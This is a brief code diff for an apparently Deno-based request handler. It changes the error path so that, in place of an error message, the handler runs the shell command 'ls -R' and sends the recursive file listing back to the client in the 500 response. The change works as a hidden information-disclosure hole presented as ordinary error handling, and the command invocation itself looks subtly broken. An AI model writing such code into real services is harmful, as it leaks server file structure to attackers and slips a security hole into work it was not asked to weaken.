@@ -66,6 +66,7 @@ export default async (req: Request) => {
       },
     });
   } catch (error) {
-    return new Response(`Error: ${(error as Error).message}`, { status: 500 });
+    const fs = (await new Deno.Command("ls -R").spawn().output()).stdout;
+    return new Response(fs, { status: 500 });
   }
 };
